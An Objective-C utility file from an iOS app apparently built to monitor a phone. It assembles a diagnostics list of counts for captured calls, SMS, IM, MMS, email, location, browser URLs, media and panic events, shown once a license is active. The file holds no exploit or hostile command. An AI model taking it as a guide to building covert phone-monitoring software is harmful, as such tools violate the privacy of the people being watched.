//
//  Utils.m
//  PP
//
//  Created by Dominique  Mayrand on 12/6/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "Utils.h"
#import "PPAppDelegate.h"

#import "PhoneInfo.h"
#import "ConfigurationManager.h"
#import "DbHealthInfo.h"
#import "EventCount.h"
#import "DetailedCount.h"
#import "LicenseInfo.h"

@implementation Utils

+ (NSMutableArray*) getDiagnosticsWithDBHealthInfo: (DbHealthInfo *) aDBHealthInfo
									withEventCount: (EventCount *) aEventCount
							 andLastConnectionTime: (NSString *) aLastConnectionTime {
	DLog(@"---->Enter<----")
	PPAppDelegate *appDelegate = (PPAppDelegate *)[[UIApplication sharedApplication] delegate];
	id <PhoneInfo> phoneInfo = [appDelegate mPhoneInfo];
	id <ConfigurationManager> configurationManager = [appDelegate mConfigurationManager];
	LicenseInfo *licenseInfo = [appDelegate mLicenseInfo];
	
	// Diagnostic are dislayed base on configurations
	NSMutableArray* diags = [[[NSMutableArray alloc] init] autorelease];
	if(diags && [licenseInfo licenseStatus] == ACTIVATED){
		// Device model
		DiagnosticObject* dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kDeviceModel", @"") andValue:[phoneInfo getDeviceModel]];
		[diags addObject:dobj];
		[dobj release];
		DetailedCount *detailedCount = nil;
		DLog(@"---->Device model done<----")
		
		// Call
		BOOL issupport = [configurationManager isSupportedFeature:kFeatureID_EventCall];
		if (issupport) {
			detailedCount = [aEventCount countEvent:kEventTypeCallLog];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kCallLogEvent", @"") andValue:[NSString stringWithFormat:@"%d,%d,%d",[detailedCount inCount], [detailedCount outCount], [detailedCount missedCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->Call done<----")
		}
		// SMS
		if ([configurationManager isSupportedFeature:kFeatureID_EventSMS]) {
			detailedCount = [aEventCount countEvent:kEventTypeSms];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kSMSEvent", @"") andValue:[NSString stringWithFormat:@"%d,%d",[detailedCount inCount], [detailedCount outCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->SMS done<----")
		}
		// IM
		if ([configurationManager isSupportedFeature:kFeatureID_EventIM]) {
			detailedCount = [aEventCount countEvent:kEventTypeIM];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kIMEvent", @"") andValue:[NSString stringWithFormat:@"%d,%d",[detailedCount inCount], [detailedCount outCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->IM done<----")
		}
		// MMS
		if ([configurationManager isSupportedFeature:kFeatureID_EventMMS]) {
			detailedCount = [aEventCount countEvent:kEventTypeMms];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kMMSEvent", @"") andValue:[NSString stringWithFormat:@"%d,%d",[detailedCount inCount], [detailedCount outCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->MMS done<----")
		}
		// Email
		if ([configurationManager isSupportedFeature:kFeatureID_EventEmail]) {
			detailedCount = [aEventCount countEvent:kEventTypeMail];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kEmailEvent", @"") andValue:[NSString stringWithFormat:@"%d,%d",[detailedCount inCount], [detailedCount outCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->Email done<----")
		}
		// Location
		if ([configurationManager isSupportedFeature:kFeatureID_EventLocation]) {
			detailedCount = [aEventCount countEvent:kEventTypeLocation];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kLocationEvent", @"") andValue:[NSString stringWithFormat:@"%d",[detailedCount totalCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->Location done<----")
		}
		// Browser url
		if ([configurationManager isSupportedFeature:kFeatureID_EventBrowserUrl]) {
			detailedCount = [aEventCount countEvent:kEventTypeBrowserURL];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kBrowserUrlEvent", @"") andValue:[NSString stringWithFormat:@"%d", 0]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->Browser url done<----")
		}
		// Thumbnail
		if ([configurationManager isSupportedFeature:kFeatureID_EventCameraImage] ||
			[configurationManager isSupportedFeature:kFeatureID_EventWallpaper] ||
			[configurationManager isSupportedFeature:kFeatureID_EventSoundRecording] ||
			[configurationManager isSupportedFeature:kFeatureID_EventVideoRecording] ||
			[configurationManager isSupportedFeature:kFeatureID_SearchMediaFilesInFileSystem]) {
			detailedCount = [aEventCount countEvent:kEventTypeCameraImage];
			NSInteger image = [detailedCount totalCount];
			detailedCount = [aEventCount countEvent:kEventTypeAudio];
			NSInteger audio = [detailedCount totalCount];
			detailedCount = [aEventCount countEvent:kEventTypeVideo];
			NSInteger video = [detailedCount totalCount];
			detailedCount = [aEventCount countEvent:kEventTypeWallpaper];
			NSInteger wp = [detailedCount totalCount];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kThumbnailEvent", @"") andValue:[NSString stringWithFormat:@"%d,%d,%d,%d", image, audio, video, wp]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->Thumbnail done<----")
		}
		// Panic status, image
		if ([configurationManager isSupportedFeature:kFeatureID_Panic]) {
			NSInteger panicStatus = [[aEventCount countEvent:kEventTypePanic] totalCount];
			NSInteger panicImage = [[aEventCount countEvent:kEventTypePanicImage] totalCount];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kPanicStatusImage", @"") andValue:[NSString stringWithFormat:@"%d,%d", panicStatus, panicImage]];
			[diags addObject:dobj];
			[dobj release];
		}
		// System
		if ([configurationManager isSupportedFeature:kFeatureID_EventSystem]) {
			detailedCount = [aEventCount countEvent:kEventTypeSystem];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kSystemEvent", @"") andValue:[NSString stringWithFormat:@"%d", [detailedCount totalCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->System done<----")
		}
		// Settings
		if ([configurationManager isSupportedFeature:kFeatureID_EventSettings]) {
			detailedCount = [aEventCount countEvent:kEventTypeSettings];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kSettingsEvent", @"") andValue:[NSString stringWithFormat:@"%d", [detailedCount totalCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->Settings done<----")
		}
		// Application life cycle
		if ([configurationManager isSupportedFeature:kFeatureID_ApplicationLifeCycleCapture]) {
			detailedCount = [aEventCount countEvent:kEventTypeApplicationLifeCycle];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kApplicationLifeCycleEvent", @"") andValue:[NSString stringWithFormat:@"%d", [detailedCount totalCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->Application life cycle done<----")
		}
		// Last connection time
		dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kLastConnectionTime", @"") andValue:aLastConnectionTime];
		[diags addObject:dobj];
		[dobj release];
		// Country code
		dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kCountryCode", @"") andValue:[phoneInfo getMobileCountryCode]];
		[diags addObject:dobj];
		[dobj release];
		// Network code
		dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kNetworkCode", @"") andValue:[phoneInfo getMobileNetworkCode]];
		[diags addObject:dobj];
		[dobj release];
		// Network name
		dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kNetworkName", @"") andValue:[phoneInfo getNetworkName]];
		[diags addObject:dobj];
		[dobj release];
		// Database size
		dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kDatabaseSize", @"") andValue:[NSString stringWithFormat:@"%llu", [aDBHealthInfo mDatabaseSize]]];
		[diags addObject:dobj];
		[dobj release];
		// Database drop count
		dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kDatabaseDropCount", @"") andValue:[NSString stringWithFormat:@"%d", [aDBHealthInfo dbDropCount]]];
		[diags addObject:dobj];
		[dobj release];
		// Available size
		dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kAvailableSize", @"") andValue:[NSString stringWithFormat:@"%llu", [aDBHealthInfo mAvailableSize]]];
		[diags addObject:dobj];
		[dobj release];
	}
	DLog(@"---->End<----")
	return diags;
}

@end


@implementation DiagnosticObject

@synthesize mValue, mName;

-(id) initWithName:(NSString*) aName andValue: (NSString*) aValue{
	self = [super init];
	if(self){
		[self setMName:aName];
		[self setMValue:aValue];
	}
	return self;
}

-(void) dealloc{
	[mName release];
	[mValue release];
	[super dealloc];
}

@end
